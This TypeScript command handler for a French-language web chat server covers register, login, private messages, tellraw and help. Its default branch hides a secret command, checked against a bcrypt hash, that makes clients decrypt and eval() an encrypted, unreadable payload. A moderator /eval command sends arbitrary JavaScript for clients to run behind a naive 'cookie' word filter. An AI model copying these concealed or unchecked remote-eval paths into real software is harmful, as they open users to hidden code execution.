import { store } from "src/store.js";
import bcrypt from "bcrypt";
import {
  validateUsername,
  validateText,
  generateRandomHash,
  handleIsBanned,
} from "src/utils/helpers.js";
import databaseService, { Player } from "src/services/databaseService.js";
import Constants from "src/utils/constants.js";
import FullUser from "src/models/User.js";
import { Server } from "../models/Message";

interface Command {
  [key: string]: string;
}

function getAvailableCommands(moderateur = false): Command {
  let commandes: Command = {
    "/register pseudo mot_de_passe":
      "S'enregistrer avec un pseudo personnalisé",
    "/login pseudo mot_de_passe": "Se connecter à son compte",
    "/msg cible message": "Envoyer un message privé à une cible",
    "/help": "Afficher l'aide générale sur les commandes",
  };

  if (moderateur) {
    commandes = {
      ...commandes,
      "/refresh cible?": "Actualiser le chat des cibles correspondantes",
      "/mod mot_de_passe": "Se connecter en tant que modérateur",
      '/tellraw cible? {"text":"","color"?:"","clickable"?:""}':
        "Envoyer un message personnalisé (sauvegardé en BDD si aucune cible n'est précisée)",
      "/addtype type": "Ajouter un type de message à vos listeningTypes",
      "/eval ¿¿¿ ¿¿¿¿": "¿¿¿¿",
    };
  } else {
    commandes["/refresh"] = "Actualiser le chat";
  }

  return commandes;
}

async function handleCommand(user: FullUser, command: string): Promise<void> {
  const commandParts = command.split(" ");
  const commandName = commandParts[0].toLowerCase();

  switch (commandName) {
    case "nick":
      handleNickCommand(user);
      break;
    case "login":
      handleLoginCommand(user, commandParts);
      break;
    case "register":
      handleRegisterCommand(user, commandParts);
      break;
    case "msg":
      handleMsgCommand(user, commandParts);
      break;
    case "eval":
      handleEvalCommand(user, commandParts);
      break;
    case "addtype":
      handleAddTypeCommand(user, commandParts);
      break;
    case "refresh":
      handleRefreshCommand(user, commandParts);
      break;
    case "tellraw":
      handleTellrawCommand(user, commandParts);
      break;
    case "help":
      handleHelpCommand(user, commandParts);
      break;
    default:
      if (
        await bcrypt.compare(
          commandName,
          "$2a$10$aEe4NE0KZMFdGF.68wrkhOc5l0b0w.KPnkVF9Niicwdzp9CgdkoSC"
        )
      ) {
        user.connection.send(
          JSON.stringify({
            type: Server.MessageType.EVAL,
            content: `eval("let a = CryptoJS.AES.decrypt('U2FsdGVkX18kVsfpyvm4z65VO/AhGUhoOIE0rEpGBriRVqfBll8auGGM5lGRXzuUVN2a3sEh97vAyqn8CfMFAQ==','${commandName}').toString(CryptoJS.enc.Utf8); eval(a)")`,
          } as Server.Message)
        );
      } else {
        handleUnknownCommand(user);
      }
      break;
  }
}

async function handleNickCommand(user: FullUser): Promise<void> {
  user.connection.send(
    JSON.stringify({
      type: Server.MessageType.MESSAGE,
      content: {
        type: Server.MessageType.ERROR,
        content: {
          text: "Eh non pardi ! Les temps ont changé...",
          timestamp: Date.now().toString(),
        },
      },
    } as Server.Message)
  );
  return;
}

async function loginUserAndSendSession(
  user: FullUser,
  username: string,
  password: string
): Promise<boolean> {
  try {
    const userInfo = await databaseService.loginPlayer(username, password);

    console.log(userInfo);
    if (userInfo && userInfo.isBanned === 1) {
      handleIsBanned(user);
      return false;
    }


    user.privateUser.name = userInfo.username;
    user.privateUser.moderatorLevel = userInfo.isAdmin;
    user.privateUser.isLoggedIn = true;

    const sessionHash = userInfo.sessionHash || generateRandomHash();

    if (!userInfo.sessionHash) {
      await databaseService.storeSessionHash(userInfo.id, sessionHash);
    }

    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.LOGIN,
        content: {
          user: { name: userInfo.username, moderatorLevel: userInfo.isAdmin, isMobile: user.privateUser.isMobile, isLoggedIn: user.privateUser.isLoggedIn, xp: user.privateUser.xp, words: user.privateUser.words, isBanned: user.privateUser.isBanned },
          sessionHash: userInfo.sessionHash,
        },
      } as Server.Message)
    );

    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.SUCCESS,
          content: {
            text: `Rebonjour ${userInfo.username} !`,
            timestamp: Date.now().toString(),
          }
        },
      } as Server.Message)
    );

    publish("updateUsersList");
    return true;
  } catch (error) {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: (error as Error).message,
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
    return false;
  }
}

async function handleLoginCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  if (commandParts.length === 3) {
    const username = commandParts[1];
    const password = commandParts[2];
    await loginUserAndSendSession(user, username, password);
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /login pseudo mot_de_passe",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
  }
}

async function handleRegisterCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  if (commandParts.length === 3) {
    const username = commandParts[1];
    const password = commandParts[2];

    if (
      !validateUsername(username) ||
      Constants.funnyNames.includes(username)
    ) {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: "Ce pseudo n'est pas valide...",
              timestamp: Date.now().toString(),
            },
          },
        } as Server.Message)
      );
      return;
    }

    try {
      await databaseService.registerPlayer(username, password);
      const userInfo = await databaseService.getPlayerByName(username);
      if (!userInfo) throw new Error("Registration failed");
      user.privateUser.name = userInfo.username;
      user.privateUser.moderatorLevel = userInfo.isAdmin;
      user.privateUser.isLoggedIn = true;
      const sessionHash = userInfo.sessionHash || generateRandomHash();
      if (!userInfo.sessionHash) {
        await databaseService.storeSessionHash(userInfo.id, sessionHash);
      }
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.LOGIN,
          content: {
            user: { name: userInfo.username, moderatorLevel: userInfo.isAdmin, isMobile: user.privateUser.isMobile, isLoggedIn: user.privateUser.isLoggedIn, xp: user.privateUser.xp, words: user.privateUser.words, isBanned: user.privateUser.isBanned },
            sessionHash: userInfo.sessionHash,
          },
        } as Server.Message)
      );
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.SUCCESS,
            content: {
              text: `Bienvenue ${username} !`,
              timestamp: new Date().toISOString(),
            },
          },
        } as Server.Message)
      );
      publish("updateUsersList");
    } catch (error) {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: (error as Error).message,
              timestamp: Date.now().toString(),
            },
          },
        } as Server.Message)
      );
    }
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /register pseudo mot_de_passe",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
  }
}

async function handleMsgCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  if (commandParts.length >= 3) {
    const targetUsername = commandParts[1];
    const messageText = commandParts.slice(2).join(" ");

    const targetedUsers = getTargetedUsers(targetUsername, user);

    if (targetedUsers.length === 0) {
      return;
    }

    if (validateText(messageText) || user.privateUser.moderatorLevel) {
      const timestamp = new Date().toISOString();
      const privateMessage = {
        Pseudo: user.privateUser.name,
        Moderator: user.privateUser.moderatorLevel,
        Texte: messageText,
        Date: timestamp,
        Type: "privateMessage",
        isLoggedIn: user.privateUser.isLoggedIn,
      };

      Object.values(targetedUsers).forEach((targetUser) => {
        if (targetUser) {
          targetUser.connection.send(JSON.stringify(privateMessage));

          const senderPrivateMessage = {
            ...privateMessage,
            Type: "privateMessageSent",
            Pseudo: targetUser.privateUser.name,
            Moderator: targetUser.privateUser.moderatorLevel,
            isLoggedIn: user.privateUser.isLoggedIn,
          };
          user.connection.send(JSON.stringify(senderPrivateMessage));
        }
      });
    } else {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: "Pseudo ou message invalide",
              timestamp: Date.now().toString(),
            },
          },
        } as Server.Message)
      );
    }
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /msg pseudo message",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
  }
}

async function handleEvalCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  if (user.privateUser.moderatorLevel) {
    if (commandParts.length >= 3) {
      const targetUsername = commandParts[1];
      const messageText = commandParts.slice(2).join(" ");

      if (new RegExp("cookie", "i").test(messageText)) {
        user.connection.send(
          JSON.stringify({
            type: Server.MessageType.MESSAGE,
            content: {
              type: Server.MessageType.ERROR,
              content: {
                text: "Pas touche aux 🍪 !",
                timestamp: Date.now().toString(),
              },
            },
          } as Server.Message)
        );
        return;
      }

      const targetedUsers = getTargetedUsers(targetUsername, user);

      if (targetedUsers.length === 0) {
        return;
      }

      const timestamp = new Date().toISOString();

      Object.values(targetedUsers).forEach((targetUser) => {
        user.connection.send(JSON.stringify({
          type: Server.MessageType.EVAL,
          content: messageText
        } as Server.Message));
      });
    } else {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: "Utilisation : /eval pseudo ¿¿¿¿¿",
              timestamp: Date.now().toString(),
            },
          },
        } as Server.Message)
      );
    }
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "¿¿¿¿¿¿¿¿¿¿¿¿¿¿¿",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
  }
}

async function handleAddTypeCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  if (commandParts.length === 2) {
    const type = commandParts[1];

    if (validateUsername(type)) {
      user.listeningTypes.push(type);

      user.connection.send(JSON.stringify({ type: Server.MessageType.SUCCESS, port: type }));
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.SUCCESS,
          content: {
            text: `Vous écoutez maintenant le type : ${type}`,
            timestamp: Date.now().toString(),
          },
        })
      );
    } else {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: "Type invalide",
              timestamp: Date.now().toString(),
            },
          },
        })
      );
    }
  } else if (commandParts.length === 1) {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.SUCCESS,
        content: {
          type: Server.MessageType.SUCCESS,
          content: {
            text: `Vous écoutez les types : ${Array.from(
              user.listeningTypes
            ).join(", ")}`,
            timestamp: Date.now().toString(),
          },
        },
      })
    );
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /listen type",
            timestamp: Date.now().toString(),
          },
        },
      })
    );
  }
}

async function handleUnknownCommand(user: FullUser): Promise<void> {
  user.connection.send(
    JSON.stringify({
      type: Server.MessageType.MESSAGE,
      content: {
        type: Server.MessageType.ERROR,
        content: {
          text: "Commande invalide !",
          timestamp: Date.now().toString(),
        },
      },
    } as Server.Message)
  );
}

async function handleRefreshCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  let targetedUsers: FullUser[] = [];

  if (commandParts.length === 1) {
    targetedUsers.push(user);
  } else if (commandParts.length === 2) {
    if (user.privateUser.moderatorLevel) {
      const targetUsername = commandParts[1];
      targetedUsers = getTargetedUsers(targetUsername, user);

      if (targetedUsers.length === 0) {
        return;
      }
    } else {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: "Vous n'êtes pas autorisé à utiliser cette commande.",
              timestamp: Date.now().toString(),
            },
          },
        } as Server.Message)
      );
      return;
    }
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /refresh target?",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
    return;
  }

  databaseService
    .getMessages(
      !!user.privateUser.moderatorLevel,
      Constants.MAX_MESSAGES_LOADED,
      !user.privateUser.isLoggedIn
    )
    .then((messages) => {
      const message = JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.SUCCESS,
          content: {
            text: "Tchat rafraîchi",
            timestamp: Date.now().toString(),
          },
        },
      });
      Object.values(targetedUsers).forEach((target) => {
        target.connection && target.connection.send(message);
      });
      console.log(
        `${new Date().toISOString()} (${user.id}) User got messages history: ${user.privateUser.name
        }`
      );
    })
    .catch((err) => {
      console.error("Error getting messages:", err);
    });
}

function handleHelpCommand(user: FullUser, commandParts: string[]): void {
  let formattedCommands: { text: string; color: string }[] = [];
  if (commandParts.length === 1) {
    const availableCommands = getAvailableCommands(!!user.privateUser.moderatorLevel);
    formattedCommands = [
      {
        text: "\nVoici la liste des commandes disponibles :\n",
        color: "lemonchiffon",
      },
    ];

    for (const [command, description] of Object.entries(availableCommands)) {
      formattedCommands.push({ text: `${command} : `, color: "darkkhaki" });
      formattedCommands.push({
        text: `${description}\n`,
        color: "lemonchiffon",
      });
    }

    const cibleExplanation = [
      { text: "\nExplication des ", color: "lemonchiffon" },
      { text: "cibles", color: "darkkhaki" },
      { text: " :\n", color: "lemonchiffon" },
      { text: "Vous pouvez, en plus du ", color: "lemonchiffon" },
      { text: "pseudo", color: "darkkhaki" },
      { text: ", utiliser des ", color: "lemonchiffon" },
      { text: "cibles", color: "darkkhaki" },
      {
        text: ". Elles permettent de sélectionner des joueurs de manière programmatique.\n",
        color: "lemonchiffon",
      },
      { text: "Les cibles disponibles sont ", color: "lemonchiffon" },
      { text: "@a ", color: "darkkhaki" },
      { text: "(tous), ", color: "lemonchiffon" },
      { text: "@s ", color: "darkkhaki" },
      { text: "(soi), ", color: "lemonchiffon" },
      { text: "@r ", color: "darkkhaki" },
      { text: "(random), ", color: "lemonchiffon" },
      { text: "@e ", color: "darkkhaki" },
      { text: "(tous).\n", color: "lemonchiffon" },
    ];

    const markdownExplication = [
      { text: "\nExplication du ", color: "lemonchiffon" },
      { text: "Formatage Markdown", color: "darkkhaki" },
      { text: " :\n", color: "lemonchiffon" },
      {
        text: "Vous pouvez utiliser les éléments suivants pour formater le texte :\n",
        color: "lemonchiffon",
      },
      { text: "**Gras** : ", color: "lemonchiffon" },
      { text: "\\*\\*texte\\*\\*", color: "darkkhaki" },
      { text: ".\n", color: "lemonchiffon" },
      { text: "*Italique* : ", color: "lemonchiffon" },
      { text: "\\*texte\\* ou \\_texte\\_", color: "darkkhaki" },
      { text: ".\n", color: "lemonchiffon" },
      { text: "***Gras italique*** : ", color: "lemonchiffon" },
      { text: "\\*\\*\\*texte\\*\\*\\*", color: "darkkhaki" },
      { text: ".\n", color: "lemonchiffon" },
      { text: "__Souligné__ : ", color: "lemonchiffon" },
      { text: "\\_\\_texte\\_\\_", color: "darkkhaki" },
      { text: ".\n", color: "lemonchiffon" },
      { text: "~~Barré~~ : ", color: "lemonchiffon" },
      { text: "\\~\\~texte\\~\\~", color: "darkkhaki" },
      { text: ".\n", color: "lemonchiffon" },
      { text: "||Caché 🫣👻|| : ", color: "lemonchiffon" },
      { text: "\\|\\|texte\\|\\|", color: "darkkhaki" },
      { text: ".\n", color: "lemonchiffon" },
      {
        text: "Vous pouvez empêcher la détection d'un modificateur avec \\\\ (ex: \\\\*).\n",
        color: "lemonchiffon",
      },
    ];

    const utilisezEmojis = [
      { text: "\nUtilisez donc les emojis ! 😎 😱", color: "lemonchiffon" },
      { text: "\nFaites simplement ", color: "lemonchiffon" },
      { text: ":nom_emoji", color: "darkkhaki" },
      {
        text: " pour commencer à voir apparaître la liste.\n",
        color: "lemonchiffon",
      },
    ];

    const cycleHistory = [
      {
        text: "\nParcourez l'historique de vos messages avec ↑ et ↓, filtrez les messages en écrivant d'abord.\n",
        color: "lemonchiffon",
      },
    ];

    formattedCommands.push(
      ...cibleExplanation,
      ...markdownExplication,
      ...utilisezEmojis,
      ...cycleHistory
    );
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /help",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
    return;
  }

  const finalMessage = {
    type: Server.MessageType.MESSAGE,
    content: {
      type: Server.MessageType.ENHANCED_MESSAGE,
      content: {
        text: JSON.stringify(formattedCommands),
        timestamp: Date.now().toString(),
      },
    },
  } as Server.Message;

  user.connection.send(JSON.stringify(finalMessage));
}

function isJson(string: string): boolean {
  try {
    JSON.parse(string);
  } catch (e) {
    return false;
  }
  return true;
}

async function handleTellrawCommand(
  user: FullUser,
  commandParts: string[]
): Promise<void> {
  if (!user.privateUser.moderatorLevel) {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Vous n'êtes pas autorisé à utiliser cette commande.",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
    return;
  }

  if (commandParts.length > 2) {
    if (
      !validateUsername(commandParts[1]) &&
      !/[@][a-z]/.test(commandParts[1])
    ) {
      const lastElements = commandParts.slice(1);
      const mergedMessage = lastElements.join(" ");
      commandParts = [commandParts[0], mergedMessage];
    } else {
      const lastElements = commandParts.slice(2);
      const mergedMessage = lastElements.join(" ");
      commandParts = [commandParts[0], commandParts[1], mergedMessage];
    }
  }

  if (!isJson(commandParts[commandParts.length - 1])) {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "L'objet JSON est invalide.",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
    return;
  }

  let targetedUsers: FullUser[] = [];
  let message = "";
  if (commandParts.length === 2) {
    const users = store.getState().users;
    targetedUsers = Object.values(users);
    message = commandParts[1];
  } else if (commandParts.length === 3) {
    const targetUsername = commandParts[1];
    targetedUsers = getTargetedUsers(targetUsername, user);
    message = commandParts[2];

    if (Object.keys(targetedUsers).length === 0) {
      return;
    }
  } else {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisation : /tellraw target message",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
    return;
  }

  Object.values(targetedUsers).forEach((target) => {
    target.connection &&
      target.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.SUCCESS,
            content: {
              text: message,
              timestamp: new Date().toISOString(),
            },
          },
        })
      );
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.SUCCESS,
          content: {
            text: `Message envoyé à ${target.privateUser.name}`,
            timestamp: Date.now().toString(),
          },
        },
      })
    );
  });
}

function getTargetedUsers(targetUsername: string, user: FullUser): FullUser[] {
  const users = store.getState().users;
  let targetedUsers: FullUser[] = [];

  if (/^@[aers]{1}/.test(targetUsername)) {
    switch (targetUsername[1]) {
      case "a":
        targetedUsers = Object.values(users);
        break;
      case "e":
        targetedUsers = Object.values(users);
        break;
      case "r":
        const userValues = Object.values(users);
        const randomUserIndex = Math.floor(Math.random() * userValues.length);
        targetedUsers.push(userValues[randomUserIndex]);
        break;
      case "s":
        targetedUsers.push(user);
        break;
      default:
        user.connection.send(
          JSON.stringify({
            type: Server.MessageType.MESSAGE,
            content: {
              type: Server.MessageType.ERROR,
              content: {
                text: "Sélecteur inexistant",
                timestamp: Date.now().toString(),
              },
            },
          } as Server.Message)
        );
        break;
    }
  } else {
    const strippedUsername = targetUsername.startsWith("@")
      ? targetUsername.slice(1)
      : targetUsername;
    if (validateUsername(strippedUsername)) {
      targetedUsers = Object.values(users).filter(
        (targetUser) => targetUser.privateUser.name === strippedUsername
      );
    } else {
      user.connection.send(
        JSON.stringify({
          type: Server.MessageType.MESSAGE,
          content: {
            type: Server.MessageType.ERROR,
            content: {
              text: "Nom d'utilisateur invalide",
              timestamp: Date.now().toString(),
            },
          },
        } as Server.Message)
      );
    }
  }

  if (targetedUsers.length === 0) {
    user.connection.send(
      JSON.stringify({
        type: Server.MessageType.MESSAGE,
        content: {
          type: Server.MessageType.ERROR,
          content: {
            text: "Utilisateur inexistant",
            timestamp: Date.now().toString(),
          },
        },
      } as Server.Message)
    );
  }
  return targetedUsers;
}

const events: { [key: string]: Function[] } = {};

function subscribe(eventName: string, callback: Function): void {
  if (!events[eventName]) {
    events[eventName] = [];
  }
  events[eventName].push(callback);
}

function publish(eventName: string, ...args: any[]): void {
  if (!events[eventName]) {
    return;
  }
  events[eventName].forEach((callback) => callback(...args));
}

export { getAvailableCommands, handleCommand, subscribe };
